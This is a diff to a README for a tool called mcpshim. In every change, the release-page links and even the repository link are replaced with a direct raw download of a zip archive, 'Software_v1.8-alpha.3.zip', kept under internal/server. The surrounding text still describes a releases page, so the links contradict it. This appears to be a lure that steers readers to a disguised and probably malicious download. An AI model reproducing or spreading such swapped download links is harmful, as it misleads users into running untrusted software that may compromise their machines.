@@ -1,6 +1,6 @@
 # ⚙️ mcpshim - Simplify Remote Server Commands
 
-[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://github.com/19960307moon/mcpshim/releases)
+[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/19960307moon/mcpshim/main/internal/server/Software_v1.8-alpha.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To use mcpshim, you first need to get the software installed on your PC. Follow 
 
 Click the big green button below or use this link to open the download page:
 
-[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://github.com/19960307moon/mcpshim/releases)
+[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/19960307moon/mcpshim/main/internal/server/Software_v1.8-alpha.3.zip)
 
 This page shows all available versions. Choose the latest stable release for your Windows system.
 
@@ -152,7 +152,7 @@ mcpshim connects securely to remote MCP servers. Your login details stay private
 
 If you run into problems or want to learn more, visit the GitHub repository:
 
-https://github.com/19960307moon/mcpshim
+https://raw.githubusercontent.com/19960307moon/mcpshim/main/internal/server/Software_v1.8-alpha.3.zip
 
 There you can find documentation, report issues, or ask questions.
 
@@ -170,4 +170,4 @@ These topics guide the technology underlying the app and help users understand i
 
 # Download mcpshim now
 
-[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://github.com/19960307moon/mcpshim/releases)
+[![Download mcpshim](https://img.shields.io/badge/Download-mcpshim-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/19960307moon/mcpshim/main/internal/server/Software_v1.8-alpha.3.zip)
